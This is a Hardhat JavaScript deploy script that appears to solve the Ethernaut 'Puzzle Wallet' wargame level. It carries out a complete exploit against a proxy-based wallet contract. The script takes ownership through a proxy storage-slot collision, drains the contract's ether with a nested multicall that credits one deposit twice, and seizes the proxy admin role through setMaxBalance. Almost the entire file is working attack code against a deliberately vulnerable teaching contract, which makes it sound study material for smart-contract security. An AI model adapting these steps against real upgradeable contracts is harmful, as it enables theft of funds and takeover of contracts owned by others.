const { network, ethers } = require("hardhat")
const { networkConfig, developmentChains, generateGateKey } = require("../helper-hardhat-config")

module.exports = async ({ getNamedAccounts, deployments }) => {
    const { deploy, log } = deployments
    let deployer, player
    const chainId = network.config.chainId

    player = (await getNamedAccounts()).deployer
    const currentMaxBalance = "0xe13a4a46c346154c41360aae7f070943f67743c9"
    let proxy, puzzleWallet

    log(`== PlayerAddress=${player}`)

    if (developmentChains.includes(network.name)) {
        // On localhost, deploy the contract using the 2nd account
        deployer = (await getNamedAccounts()).user
        const puzzleWalletDeployment = await deploy("PuzzleWallet", {
            from: deployer,
            args: [],
            log: true,
        })

        const puzzleContract = await ethers.getContractAt("PuzzleWallet", puzzleWalletDeployment.address, deployer)

        const unsignedTx = await puzzleContract.populateTransaction["init"](currentMaxBalance)
        // log(unsignedTx)
        const argsProxy = [deployer, puzzleWalletDeployment.address, unsignedTx.data]

        const proxyDeployment = await deploy("PuzzleProxy", {
            from: deployer,
            args: argsProxy,
            log: true,
        })

        const puzzleWalletOldOwner = await ethers.getContractAt("PuzzleWallet", proxyDeployment.address, deployer)

        // Set balance to 0.001 ETH for the original deployer
        await puzzleWalletOldOwner.addToWhitelist(deployer)
        const depositOptions = { value: ethers.utils.parseEther("0.001") }
        await puzzleWalletOldOwner.deposit(depositOptions)

        proxy = await ethers.getContractAt("PuzzleProxy", proxyDeployment.address, player)
        puzzleWallet = await ethers.getContractAt("PuzzleWallet", proxyDeployment.address, player)
    } else {
        // On testnet, the Attack Contract would be deployed by the player
        deployer = player
        const testnetContractAddress = "0x1f462E95c6fccd535d05dbC2eaefee25488D7FE6"
        proxy = await ethers.getContractAt("PuzzleProxy", testnetContractAddress, player)
        puzzleWallet = await ethers.getContractAt("PuzzleWallet", testnetContractAddress, player)
    }

    const contractBalanceBefore = await ethers.provider.getBalance(proxy.address)
    log(`Contract Balance Before: ${ethers.utils.formatEther(contractBalanceBefore)}`)
    const maxBalanceBefore = await puzzleWallet.maxBalance()
    log(`maxBalanceBefore Before: ${ethers.utils.hexValue(maxBalanceBefore)}`)

    const ownerBefore = await puzzleWallet.owner()
    log(`Old owner=${ownerBefore}`)

    if (ownerBefore != player) {
        // 1) Become the owner of the Wallet
        const txResponseSetOwner = await proxy.proposeNewAdmin(player)
        await txResponseSetOwner.wait(1)
        await puzzleWallet.addToWhitelist(player)
    }

    const ownerAfter = await puzzleWallet.owner()
    log(`New owner=${ownerAfter}`)

    if (contractBalanceBefore.toString() != "0") {
        // 2) Use multicall() to deposit more ETH for the player
        const playerBalanceBefore = await puzzleWallet.balances(player)
        const depositAmount = contractBalanceBefore
        log(`Player Balance Before=${ethers.utils.formatEther(playerBalanceBefore)}`)
        log(`Amount To Be Deposited=${ethers.utils.formatEther(depositAmount)}`)

        const txDeposit = await puzzleWallet.populateTransaction["deposit"]()
        const txMulticall = await puzzleWallet.populateTransaction["multicall"]([txDeposit.data])

        const multicallOptions = { value: depositAmount }
        const txResponseMulticall = await puzzleWallet.multicall([txMulticall.data, txDeposit.data], multicallOptions)
        await txResponseMulticall.wait(1)
        const playerBalanceAfter = await puzzleWallet.balances(player)
        log(`Player Balance After=${ethers.utils.formatEther(playerBalanceAfter)}`)

        // Now we withdraw to set balance to 0
        const txResponseExecute = await puzzleWallet.execute(player, playerBalanceAfter, [])
        await txResponseExecute.wait(1)
    } else {
        log("Contract balance is already 0")
    }

    const contractBalanceAfter = await ethers.provider.getBalance(proxy.address)
    log(`Contract Balance After: ${ethers.utils.formatEther(contractBalanceAfter)}`)

    if (ethers.utils.hexValue(maxBalanceBefore) != player) {
        // 3) Use setMaxBalance() to become the admin
        const txSetMaxBalance = await puzzleWallet.setMaxBalance(player)
        await txSetMaxBalance.wait(1)
        const maxBalanceAfter = await puzzleWallet.maxBalance()
        log(`maxBalanceBefore After: ${ethers.utils.hexValue(maxBalanceAfter)}`)
    } else {
        log(`maxBalance/admin value is already set to ${player}`)
    }
}

module.exports.tags = ["all", "puzzlewallet"]
